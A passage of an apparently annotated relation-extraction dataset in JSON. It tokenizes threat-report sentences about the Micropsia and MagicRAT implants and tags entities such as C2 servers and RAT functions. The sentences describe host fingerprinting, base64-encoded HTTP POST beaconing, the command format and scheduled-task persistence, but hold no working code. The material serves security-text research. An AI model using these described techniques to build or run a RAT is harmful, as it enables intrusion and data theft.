"MF", "sent_id": 5, "global_pos": [135, 135], "name": "command line", "pos": [6, 8], "index": "8_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [171, 171], "name": "C2 server", "pos": [8, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [183, 183], "name": "Micropsia implants", "pos": [20, 22], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 8}, {"r": "ST", "evidence": [7], "t": 9, "h": 10}]}, {"title": "033-8", "sents": [["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [6, 6], "name": "PC ID", "pos": [6, 8], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [14, 14], "name": "data file", "pos": [14, 16], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [26, 26], "name": "Computername and username", "pos": [1, 4], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [67, 67], "name": "installed antivirus software", "pos": [3, 6], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [91, 91], "name": "DisplayName", "pos": [27, 28], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [96, 96], "name": "name", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "command line", "pos": [6, 8], "index": "6_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [149, 149], "name": "C2 server", "pos": [8, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "Micropsia implants", "pos": [20, 22], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [172, 172], "name": "implant", "pos": [8, 9], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "RAT", "pos": [15, 16], "index": "10_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [193, 193], "name": "C2 ) server", "pos": [29, 32], "index": "11_0"}]], "labels": [{"r": "ST", "evidence": [6], "t": 7, "h": 8}, {"r": "EX", "evidence": [6, 7], "h": 8, "t": 9}, {"r": "FR", "evidence": [6, 7], "h": 8, "t": 10}, {"r": "RF", "evidence": [6, 7], "h": 8, "t": 11}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 11}]}, {"title": "033-9", "sents": [["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [1, 1], "name": "Computername and username", "pos": [1, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [42, 42], "name": "installed antivirus software", "pos": [3, 6], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [66, 66], "name": "DisplayName", "pos": [27, 28], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [71, 71], "name": "name", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [88, 88], "name": "command line", "pos": [6, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [124, 124], "name": "C2 server", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "Micropsia implants", "pos": [20, 22], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [147, 147], "name": "implant", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [154, 154], "name": "RAT", "pos": [15, 16], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [168, 168], "name": "C2 ) server", "pos": [29, 32], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [5], "t": 5, "h": 6}, {"r": "EX", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "FR", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "RF", "evidence": [5, 6], "h": 6, "t": 9}, {"r": "CO", "evidence": [5, 6], "h": 5, "t": 9}]}, {"title": "033-10", "sents": [["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [3, 3], "name": "installed antivirus software", "pos": [3, 6], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [27, 27], "name": "DisplayName", "pos": [27, 28], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [32, 32], "name": "name", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "command line", "pos": [6, 8], "index": "3_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [85, 85], "name": "C2 server", "pos": [8, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "Micropsia implants", "pos": [20, 22], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [108, 108], "name": "implant", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [115, 115], "name": "RAT", "pos": [15, 16], "index": "7_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [129, 129], "name": "C2 ) server", "pos": [29, 32], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [152, 152], "name": "commands", "pos": [1, 2], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [4], "t": 4, "h": 5}, {"r": "EX", "evidence": [4, 5], "h": 5, "t": 6}, {"r": "FR", "evidence": [4, 5], "h": 5, "t": 7}, {"r": "RF", "evidence": [4, 5], "h": 5, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 4, "t": 8}]}, {"title": "033-11", "sents": [["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."], ["For", "example", ",", "executing", "the", "``", "ipconfig", "''", "command", "on", "the", "endpoint", "would", "require", "the", "above", "format", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [1, 1], "name": "name", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "command line", "pos": [6, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [54, 54], "name": "C2 server", "pos": [8, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "Micropsia implants", "pos": [20, 22], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [77, 77], "name": "implant", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [84, 84], "name": "RAT", "pos": [15, 16], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [98, 98], "name": "C2 ) server", "pos": [29, 32], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [121, 121], "name": "commands", "pos": [1, 2], "index": "7_0"}]], "labels": [{"r": "ST", "evidence": [3], "t": 2, "h": 3}, {"r": "EX", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "RF", "evidence": [3, 4], "h": 3, "t": 6}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 6}]}, {"title": "033-12", "sents": [["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."], ["For", "example", ",", "executing", "the", "``", "ipconfig", "''", "command", "on", "the", "endpoint", "would", "require", "the", "above", "format", "."], ["Two", "additional", "HTTP", "form", "variables", "are", "used", "by", "the", "implant", "to", "transmit", "the", "output", "of", "executed", "commands", "back", "to", "the", "C2", "server", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "command line", "pos": [6, 8], "index": "0_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [42, 42], "name": "C2 server", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "Micropsia implants", "pos": [20, 22], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "implant", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [72, 72], "name": "RAT", "pos": [15, 16], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [86, 86], "name": "C2 ) server", "pos": [29, 32], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [109, 109], "name": "commands", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [175, 175], "name": "C2 server", "pos": [20, 22], "index": "7_0"}]], "labels": [{"r": "ST", "evidence": [2], "t": 1, "h": 2}, {"r": "EX", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "RF", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 1, "t": 5}]}, {"title": "033-13", "sents": [["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."], ["For", "example", ",", "executing", "the", "``", "ipconfig", "''", "command", "on", "the", "endpoint", "would", "require", "the", "above", "format", "."], ["Two", "additional", "HTTP", "form", "variables", "are", "used", "by", "the", "implant", "to", "transmit", "the", "output", "of", "executed", "commands", "back", "to", "the", "C2", "server", "."], ["Available", "commands", "include", "capturing", "screenshots", ",", "logging", "activity", ",", "executing", "user-specified", "commands", "and", "downloading", "files", "from", "remote", "locations", "."]], "vertexSet": [[{"type": "SO", "sent_id": 1, "global_pos": [29, 29], "name": "C2 server", "pos": [8, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "Micropsia implants", "pos": [20, 22], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "implant", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "RAT", "pos": [15, 16], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [73, 73], "name": "C2 ) server", "pos": [29, 32], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "commands", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [162, 162], "name": "C2 server", "pos": [20, 22], "index": "6_0"}]], "labels": [{"r": "ST", "evidence": [1], "t": 0, "h": 1}, {"r": "EX", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 4}]}, {"title": "033-14", "sents": [["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."], ["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."], ["For", "example", ",", "executing", "the", "``", "ipconfig", "''", "command", "on", "the", "endpoint", "would", "require", "the", "above", "format", "."], ["Two", "additional", "HTTP", "form", "variables", "are", "used", "by", "the", "implant", "to", "transmit", "the", "output", "of", "executed", "commands", "back", "to", "the", "C2", "server", "."], ["Available", "commands", "include", "capturing", "screenshots", ",", "logging", "activity", ",", "executing", "user-specified", "commands", "and", "downloading", "files", "from", "remote", "locations", "."], ["Two", "separate", "URLs", "are", "also", "used", "to", "communicate", "with", "the", "C2", "server", ";", "one", "URL", "is", "used", "exclusively", "for", "exfiltrating", "screenshots", ",", "while", "the", "other", "is", "used", "for", "all", "other", "RAT", "commands", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "C2 server", "pos": [8, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "Micropsia implants", "pos": [20, 22], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "implant", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "RAT", "pos": [15, 16], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "C2 ) server", "pos": [29, 32], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "commands", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [141, 141], "name": "C2 server", "pos": [20, 22], "index": "6_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [165, 165], "name": "URLs", "pos": [2, 3], "index": "7_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [173, 173], "name": "C2", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [193, 193], "name": "RAT commands", "pos": [30, 32], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}]}, {"title": "033-15", "sents": [["After", "sending", "preliminary", "system", "information", ",", "the", "Micropsia", "implant", "activates", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "and", "listens", "for", "command", "codes", "from", "its", "command", "and", "control", "(", "C2", ")", "server", "."], ["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."], ["For", "example", ",", "executing", "the", "``", "ipconfig", "''", "command", "on", "the", "endpoint", "would", "require", "the", "above", "format", "."], ["Two", "additional", "HTTP", "form", "variables", "are", "used", "by", "the", "implant", "to", "transmit", "the", "output", "of", "executed", "commands", "back", "to", "the", "C2", "server", "."], ["Available", "commands", "include", "capturing", "screenshots", ",", "logging", "activity", ",", "executing", "user-specified", "commands", "and", "downloading", "files", "from", "remote", "locations", "."], ["Two", "separate", "URLs", "are", "also", "used", "to", "communicate", "with", "the", "C2", "server", ";", "one", "URL", "is", "used", "exclusively", "for", "exfiltrating", "screenshots", ",", "while", "the", "other", "is", "used", "for", "all", "other", "RAT", "commands", "."], ["It", "should", "be", "noted", "that", "different", "implants", "may", "use", "different", "URLs", "for", "different", "functions", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "implant", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "RAT", "pos": [15, 16], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [29, 29], "name": "C2 ) server", "pos": [29, 32], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "commands", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [118, 118], "name": "C2 server", "pos": [20, 22], "index": "4_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [142, 142], "name": "URLs", "pos": [2, 3], "index": "5_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [150, 150], "name": "C2", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "RAT commands", "pos": [30, 32], "index": "7_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [183, 183], "name": "URLs", "pos": [10, 11], "index": "8_0"}]], "labels": []}, {"title": "033-16", "sents": [["The", "C2", "issues", "specific", "command", "codes", "to", "the", "implant", "to", "perform", "different", "actions", "on", "the", "infected", "endpoint", "."], ["These", "commands", "are", "sent", "in", "an", "HTTP", "form", "variable", "that", "includes", "supporting", "data", "base64-encoded", "in", "the", "format", "``", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";", "''", "."], ["For", "example", ",", "executing", "the", "``", "ipconfig", "''", "command", "on", "the", "endpoint", "would", "require", "the", "above", "format", "."], ["Two", "additional", "HTTP", "form", "variables", "are", "used", "by", "the", "implant", "to", "transmit", "the", "output", "of", "executed", "commands", "back", "to", "the", "C2", "server", "."], ["Available", "commands", "include", "capturing", "screenshots", ",", "logging", "activity", ",", "executing", "user-specified", "commands", "and", "downloading", "files", "from", "remote", "locations", "."], ["Two", "separate", "URLs", "are", "also", "used", "to", "communicate", "with", "the", "C2", "server", ";", "one", "URL", "is", "used", "exclusively", "for", "exfiltrating", "screenshots", ",", "while", "the", "other", "is", "used", "for", "all", "other", "RAT", "commands", "."], ["It", "should", "be", "noted", "that", "different", "implants", "may", "use", "different", "URLs", "for", "different", "functions", "."], ["For", "instance", ",", "one", "Micropsia", "implant", "we", "observed", "used", "a", "distinct", "URL", "for", "the", "screenshot", "function", ",", "while", "another", "URL", "was", "employed", "for", "all", "other", "commands", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "commands", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [85, 85], "name": "C2 server", "pos": [20, 22], "index": "1_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [109, 109], "name": "URLs", "pos": [2, 3], "index": "2_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [117, 117], "name": "C2", "pos": [10, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": "RAT commands", "pos": [30, 32], "index": "4_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [150, 150], "name": "URLs", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [166, 166], "name": "URL", "pos": [11, 12], "index": "6_0"}]], "labels": []}, {"title": "010-0", "sents": [["MagicRATMagicRAT", "is", "programmed", "in", "C++", "programming", "language", "and", "uses", "the", "Qt", "Framework", "by", "statically", "linking", "it", "to", "the", "RAT", "on", "32-", "and", "64-bit", "versions", "."], ["The", "RAT", "uses", "the", "Qt", "classes", "throughout", "its", "entire", "code", "."], ["The", "configuration", "is", "dynamically", "stored", "in", "a", "QSettings", "class", "eventually", "being", "saved", "to", "disk", ",", "a", "typical", "functionality", "provided", "by", "that", "class", "."], ["The", "malware", "configuration", "(", "containing", "author-defined", "QSettings", ")", "is", "stored", "in", "the", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "in", "the", "path", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "-", "names", "and", "paths", "obviously", "chosen", "to", "trick", "the", "victim", "into", "believing", "they", "were", "part", "of", "the", "operating", "system", "."], ["[", "os", "]", "which", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "."], ["All", "analyzed", "samples", "had", "three", "encoded", "C2", "URLs", "that", "are", "used", "to", "register", "infections", "and", "then", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", "."], ["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "MagicRATMagicRAT", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "RAT", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [117, 117], "name": "samples", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "MagicRAT", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "command", "pos": [12, 13], "index": "4_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "t": 0, "h": 3}, {"r": "EX", "evidence": [7], "h": 3, "t": 4}]}, {"title": "010-1", "sents": [["The", "RAT", "uses", "the", "Qt", "classes", "throughout", "its", "entire", "code", "."], ["The", "configuration", "is", "dynamically", "stored", "in", "a", "QSettings", "class", "eventually", "being", "saved", "to", "disk", ",", "a", "typical", "functionality", "provided", "by", "that", "class", "."], ["The", "malware", "configuration", "(", "containing", "author-defined", "QSettings", ")", "is", "stored", "in", "the", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "in", "the", "path", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "-", "names", "and", "paths", "obviously", "chosen", "to", "trick", "the", "victim", "into", "believing", "they", "were", "part", "of", "the", "operating", "system", "."], ["[", "os", "]", "which", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "."], ["All", "analyzed", "samples", "had", "three", "encoded", "C2", "URLs", "that", "are", "used", "to", "register", "infections", "and", "then", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", "."], ["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "RAT", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "samples", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "MagicRAT", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [150, 150], "name": "command", "pos": [12, 13], "index": 